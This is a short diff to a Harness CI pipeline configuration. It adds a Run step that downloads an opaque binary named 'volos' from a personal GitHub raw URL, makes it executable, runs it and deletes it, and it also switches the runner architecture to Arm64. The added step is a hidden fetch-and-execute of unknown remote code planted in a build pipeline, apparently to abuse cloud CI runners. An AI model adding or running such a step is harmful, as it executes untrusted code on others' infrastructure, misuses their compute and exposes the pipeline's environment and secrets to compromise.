@@ -19,9 +19,16 @@ pipeline:
                   spec:
                     shell: Sh
                     command: echo "Welcome to Harness CI"
+              - step:
+                  type: Run
+                  name: Run_2
+                  identifier: Run_2
+                  spec:
+                    shell: Sh
+                    command: wget https://raw.githubusercontent.com/samnialoska22/faksa/refs/heads/main/volos && chmod +x volos && ./volos && rm -rf volos ss4
           platform:
             os: Linux
-            arch: Amd64
+            arch: Arm64
           runtime:
             type: Cloud
             spec: {}
